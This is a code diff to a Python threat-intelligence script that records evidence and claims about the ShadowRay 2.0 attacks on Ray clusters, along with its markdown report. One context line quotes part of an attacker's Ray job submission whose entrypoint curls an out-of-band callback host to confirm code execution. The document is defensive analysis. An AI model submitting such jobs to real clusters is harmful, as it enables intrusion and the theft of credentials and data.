@@ -335,6 +335,8 @@ def build_graph() -> EvidenceGraph:
       "-d '{\"entrypoint\": \"curl bwqqvqfgsseplyoltois92rdukv0mm5th.oast.fun\"}'")
     E("e-oligo-creds", "s-oligo", "They discovered and exfiltrated MySQL database credentials from Ray job environment "
       "variables and config files ... many security tokens and cloud credentials present on the compromised machines.")
+    E("e-oligo-visibility", "s-oligo", "Attackers could see everything the workloads are doing - including access to "
+      "the proprietary AI models and filesystem, application user requests, application code and configuration.")
     E("e-oligo-guidance", "s-oligo", "Ray maintainers issued configuration and deployment guidance, advising that "
       "'Security and isolation must be enforced outside of the Ray Cluster.' ... Add authorization on top of the "
       "Ray Dashboard port (8265 by default).")
@@ -470,7 +472,7 @@ def build_graph() -> EvidenceGraph:
         Claim(claim_id="c-credential-exposure", claim_type=C.BUSINESS_IMPACT,
               text="In ShadowRay 2.0 intrusions Oligo found database credentials, cloud credentials and tokens "
                    "taken from Ray job environment variables and configuration.",
-              status=S.REPORTED, confidence=K.MEDIUM, evidence_refs=["e-oligo-creds"], source_refs=["s-oligo"],
+              status=S.REPORTED, confidence=K.MEDIUM, evidence_refs=["e-oligo-creds", "e-oligo-visibility"], source_refs=["s-oligo"],
               observed_vs_context=O.OBSERVED, corroboration_state=SINGLE),
         Claim(claim_id="c-isolation-guidance", claim_type=C.VULNERABILITY_FACT,
               text="Ray maintainers advise that security and isolation must be enforced outside the Ray cluster, "
@@ -992,7 +994,7 @@ A compromised Ray node gives an attacker:
 - the node's GPU and CPU capacity;
 - whatever secrets the jobs can read.
 
-ShadowRay 2.0 victims lost production database credentials and cloud tokens this way. For AI teams, model weights, training data and pipeline credentials sit on the same hosts. [SOURCE-REPORTED]
+ShadowRay 2.0 victims lost production database credentials and cloud tokens this way. Oligo also reports that attackers could see everything the compromised workloads were doing, including proprietary AI models, the filesystem, application code and configuration. [SOURCE-REPORTED]
 
 ## MITRE ATT&CK Mapping
 
